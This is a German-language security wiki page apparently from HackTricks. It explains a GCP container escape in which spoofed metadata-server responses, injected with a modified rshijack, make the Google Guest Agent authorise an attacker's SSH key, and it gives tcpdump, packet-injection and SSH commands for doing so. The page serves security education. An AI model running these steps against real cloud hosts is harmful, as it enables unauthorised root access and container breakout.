# GCP - Network Docker Escape

{{#include ../../../banners/hacktricks-training.md}}

## Ausgangszustand

In beiden Writeups, in denen diese Technik beschrieben wird, gelang es den Angreifern, innerhalb eines von GCP verwalteten **Docker**-Containers mit Zugriff auf das Host-Netzwerk **root**-Zugriff zu erlangen (und die Fähigkeiten **`CAP_NET_ADMIN`** und **`CAP_NET_RAW`** zu besitzen).

## Erklärung des Angriffs

Bei der regulären Analyse des Netzwerkverkehrs auf einer Google Compute Engine-Instanz fallen zahlreiche unverschlüsselte **HTTP-Anfragen** an die Metadata-Instanz unter 169.254.169.254 auf. Der [**Google Guest Agent**](https://github.com/GoogleCloudPlatform/guest-agent), ein Open-Source-Service, stellt häufig solche Anfragen.

Dieser Agent ist dafür ausgelegt, **Änderungen in den Metadaten zu überwachen**. Bemerkenswert ist, dass die Metadaten ein **Feld für SSH public keys** enthalten. Wenn ein neuer öffentlicher SSH-Schlüssel zu den Metadaten hinzugefügt wird, autorisiert der Agent ihn automatisch in der Datei `.authorized_key`. Er kann außerdem **einen neuen Benutzer anlegen** und diesen bei Bedarf zu den **sudoers** hinzufügen.

Der Agent überwacht Änderungen, indem er eine Anfrage sendet, um alle Metadatenwerte rekursiv abzurufen (`GET /computeMetadata/v1/?recursive=true`). Diese Anfrage ist so gestaltet, dass der Metadata-Server nur dann eine Antwort liefert, wenn sich die Metadaten seit der letzten Abfrage geändert haben, identifiziert durch ein ETag (`wait_for_change=true&last_etag=`). Zusätzlich wird ein **Timeout**-Parameter (`timeout_sec=`) übergeben. Falls sich innerhalb des angegebenen Timeouts nichts ändert, antwortet der Server mit den **unveränderten Werten**.

Dieser Prozess erlaubt es dem **IMDS** (Instance Metadata Service), nach **60 Sekunden** zu antworten, falls keine Konfigurationsänderung stattgefunden hat, wodurch ein potenzielles **Fenster für das Einspeisen einer gefälschten Konfigurationsantwort** an den Guest Agent entsteht.

Ein Angreifer könnte dies ausnutzen, indem er eine Man-in-the-Middle (MitM) attack durchführt, die Antwort des IMDS-Servers fälscht und einen **neuen Public Key einfügt**. Dadurch könnte unautorisierter SSH-Zugriff auf den Host ermöglicht werden.

### Escape-Technik

Während ARP-Spoofing in Google Compute Engine-Netzwerken unwirksam ist, kann eine [**modifizierte Version von rshijack**](https://github.com/ezequielpereira/rshijack), entwickelt von [**Ezequiel**](https://www.ezequiel.tech/2020/08/dropping-shell-in.html), verwendet werden, um Pakete in der Kommunikation zu injizieren und den SSH-Benutzer einzuspeisen.

Diese Version von rshijack erlaubt es, die ACK- und SEQ-Nummern als Kommandozeilenargumente einzuspeisen, was das Fälschen einer Antwort vor der echten Antwort des Metadata-Servers erleichtert. Zusätzlich wird ein [**kleines Shell-Skript**](https://gist.github.com/ezequielpereira/914c2aae463409e785071213b059f96c#file-fakedata-sh) verwendet, um eine **speziell gestaltete Payload** zurückzugeben. Diese Payload veranlasst den Google Guest Agent dazu, den Benutzer `wouter` mit einem angegebenen Public Key in der Datei `.authorized_keys` anzulegen.

Das Skript verwendet dasselbe ETag, um zu verhindern, dass der Metadata-Server den Google Guest Agent sofort über unterschiedliche Metadatenwerte informiert, und verzögert so die Antwort.

Um das Spoofing durchzuführen, sind folgende Schritte erforderlich:

1. **Überwache Anfragen an den Metadata-Server** mit **tcpdump**:

<details>
<summary>Überwache Metadata-Server-Anfragen mit tcpdump</summary>
```bash
tcpdump -S -i eth0 'host 169.254.169.254 and port 80' &
```
</details>

Suchen Sie nach einer Zeile, die etwa so aussieht:

<details>
<summary>Beispiel tcpdump-Ausgabezeile</summary>
```
<TIME> IP <LOCAL_IP>.<PORT> > 169.254.169.254.80: Flags [P.], seq <NUM>:<TARGET_ACK>, ack <TARGET_SEQ>, win <NUM>, length <NUM>: HTTP: GET /computeMetadata/v1/?timeout_sec=<SECONDS>&last_etag=<ETAG>&alt=json&recursive=True&wait_for_change=True HTTP/1.1
```
</details>

2. Sende die gefälschten Metadaten mit dem korrekten ETAG an rshijack:

<details>
<summary>Gefälschte Metadaten senden und per SSH auf den Host zugreifen</summary>
```bash
fakeData.sh <ETAG> | rshijack -q eth0 169.254.169.254:80 <LOCAL_IP>:<PORT> <TARGET_SEQ> <TARGET_ACK>; ssh -i id_rsa -o StrictHostKeyChecking=no wouter@localhost
```
</details>

Dieser Schritt autorisiert den öffentlichen Schlüssel und ermöglicht die SSH-Verbindung mit dem entsprechenden privaten Schlüssel.

## Quellen

- [https://www.ezequiel.tech/2020/08/dropping-shell-in.html](https://www.ezequiel.tech/2020/08/dropping-shell-in.html)
- [https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)

{{#include ../../../banners/hacktricks-training.md}}
